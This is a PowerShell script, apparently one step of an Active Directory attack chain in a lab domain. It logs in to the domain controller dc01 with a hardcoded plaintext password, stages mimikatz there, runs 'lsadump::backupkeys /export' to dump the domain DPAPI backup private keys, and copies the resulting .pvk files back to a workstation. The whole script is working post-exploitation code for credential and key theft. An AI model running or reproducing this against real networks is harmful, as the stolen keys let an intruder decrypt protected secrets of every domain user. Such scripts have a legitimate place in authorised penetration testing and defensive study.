# 3.5G step 1b: run mimikatz backupkeys LOCALLY on dc01 via WinRM, pull .pvk back
$ErrorActionPreference = 'Continue'

$cred = New-Object System.Management.Automation.PSCredential('cadre.local\chief_command', (ConvertTo-SecureString 'C0mm@nd_Ch1ef!' -AsPlainText -Force))

Write-Output '=== NEW-PSSESSION dc01 ==='
try {
    $s = New-PSSession -ComputerName 'dc01.cadre.local' -Credential $cred -ErrorAction Stop
    Write-Output 'SESSION_OK'

    # stage mimikatz to dc01
    Copy-Item -Path 'C:\Tools\ADTools\mimikatz.exe' -Destination 'C:\Windows\Temp\mimikatz.exe' -ToSession $s -Force
    Write-Output 'MIK_STAGED_DC01'

    # run backupkeys locally
    $out = Invoke-Command -Session $s -ScriptBlock {
        Set-Location C:\Windows\Temp
        $r = & .\mimikatz.exe 'lsadump::backupkeys /export' 'exit' 2>&1
        $r | Select-String -Pattern 'GUID|Preferred|DPAPI|backup|\.pvk|base64|ERROR' | Select-Object -First 25 | ForEach-Object { $_.Line }
        Write-Output '---PVK-FILES---'
        Get-ChildItem C:\Windows\Temp\*.pvk -ErrorAction SilentlyContinue | ForEach-Object { "$($_.FullName)|$($_.Length)" }
    }
    $out | ForEach-Object { Write-Output "DC01|$_" }

    # pull .pvk back to ws01
    $pvks = Invoke-Command -Session $s -ScriptBlock { Get-ChildItem C:\Windows\Temp\*.pvk -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName }
    foreach ($p in $pvks) {
        Copy-Item -FromSession $s -Path $p -Destination 'C:\Tools\ADTools\' -Force
        Write-Output "PVK_PULLED $p"
    }
    Remove-PSSession $s
} catch { Write-Output "DC01_ERR|$($_.Exception.Message)" }
Write-Output '3.5G_STEP1B_DONE'
